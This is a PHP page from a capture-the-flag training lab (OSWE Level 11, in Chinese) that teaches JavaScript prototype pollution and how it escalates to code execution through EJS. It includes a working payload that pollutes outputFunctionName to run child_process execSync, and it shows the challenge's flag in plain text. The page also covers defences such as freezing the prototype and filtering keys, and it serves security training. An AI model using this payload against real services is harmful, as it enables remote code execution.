<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[293] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSWE_L11_Prototype_Pollution_EJS_Handlebars}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['oswe_flags']['flag4'] = true;
        $flag_msg = '<div class="alert alert-success">✅ 通关！完全掌握了 JavaScript 原型链污染及其 RCE 利用。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger">❌ Flag 错误，请仔细查看 Prototype 分析过程。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.step-box { background:#ffffff; border:1px solid #e2e8f0; border-radius:12px; padding:24px; margin-bottom:22px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
.step-title { font-size:16px; font-weight:700; color:#0f172a; margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#06b6d4,#22d3ee); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:#334155; line-height:1.7; }
.flag-submit-area { background:#f8fafc; border:2px dashed rgba(6,182,212,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
.nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
.btn-nav { background: #06b6d4; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; }
.btn-nav:hover { background: #0891b2; color: white; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h2>OSWE Level 11: JavaScript 原型链污染深度利用</h2>
        <p>300 PTS | 核心考点: Prototype Pollution, EJS/Handlebars 模板 RCE, 代码审计</p>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> JavaScript 原型链基础机制</h3>
        <p>在 JavaScript 中，对象都隐式地链接到其原型（`__proto__`）。当我们访问对象的一个属性时，如果当前对象没有，引擎就会去其原型链上找。修改根原型 `Object.prototype` 会影响所有创建出的对象！</p>
        <div class="cmd-box">
            let obj1 = {};<br>
            console.log(obj1.isAdmin); // undefined<br>
            <br>
            <span class="comment">// 恶意污染原型链</span><br>
            obj1.__proto__.isAdmin = true;<br>
            <br>
            <span class="comment">// 影响了全新的对象 obj2</span><br>
            let obj2 = {};<br>
            console.log(obj2.isAdmin); // true
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> 漏洞识别：深层归并函数 (Deep Merge)</h3>
        <p>原型链污染通常发生在使用不安全的深度合并（Merge）、克隆（Clone）或者设置路径属性时，比如有漏洞版本的 `lodash.merge`、`jQuery.extend(true, ...)`。</p>
        <div class="highlight-box">
            漏洞发生点：当应用接收 JSON 输入，且未过滤 `__proto__` 键，直接将其合并进已有对象时：<br>
            <code>{"__proto__": {"malicious_property": "pwned"}}</code>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> 结合 EJS 模板引擎实现 RCE</h3>
        <p>如果在 Node.js 环境中触发了原型链污染，怎么升级为 RCE？常见的方法是污染模板引擎在渲染时引用的未定义属性。以 <code>EJS</code> 为例：</p>
        <div class="cmd-box">
            <span class="comment"># EJS 内部会拼接代码执行，污染 outputFunctionName 可注入代码</span><br>
            {"__proto__": {<br>
            &nbsp;&nbsp;&nbsp;&nbsp;"outputFunctionName": "a; return global.process.mainModule.require('child_process').execSync('id'); //"<br>
            }}
        </div>
        <p>当 EJS 下次渲染模板时，这段注入的 JS 代码就会被执行。</p>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">4</span> 复杂应用案例与实战验证</h3>
        <p>在类似于 Guacamole Lite 或其他涉及 WebSocket 连接和复杂 JSON 解析的应用中。攻击面往往隐藏在 Session 处理、配置更新模块中。通过编写 Python 脚本发送带有 `__proto__` 的 Payload 可以验证是否影响了服务端应用流。</p>
        <div class="cmd-box">
            <span class="comment"># 恭喜你，这部分是 OSWE 的大部头，请保存 FLAG：</span><br>
            <span class="flag-text">flag{OSWE_L11_Prototype_Pollution_EJS_Handlebars}</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">5</span> 防御机制与安全实践</h3>
        <p>彻底防御原型污染，需要从以下几方面入手：</p>
        <ul>
            <li><strong>冻结原型：</strong> 在应用入口处执行 <code>Object.freeze(Object.prototype);</code></li>
            <li><strong>无原型对象：</strong> 使用 <code>Object.create(null)</code> 创建字典对象，它没有原型链。</li>
            <li><strong>输入过滤：</strong> 严格校验输入数据的 Key，过滤包含 <code>__proto__</code> 或 <code>constructor.prototype</code> 的字段。</li>
            <li><strong>依赖库更新：</strong> 确保使用的第三方深拷贝库没有已知的原型污染 CVE。</li>
        </ul>
    </div>

    <div class="flag-submit-area">
        <form method="POST">
            <h4>提交 Flag</h4>
            <input type="text" name="user_flag" class="form-control" style="width:50%; margin:10px auto;" placeholder="flag{...}">
            <button type="submit" name="check_flag" class="btn btn-primary" style="background:#06b6d4;border:none;">验证</button>
            <?php if($flag_msg) echo "<div style='margin-top:15px;'>$flag_msg</div>"; ?>
        </form>
    </div>

    <div class="nav-buttons">
        <a href="oswe_l10_java_rce.php" class="btn-nav">上一关: Java RCE 链</a>
        <a href="#" class="btn-nav" style="visibility:hidden;">下一关</a>
    </div>

</div></div></div>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
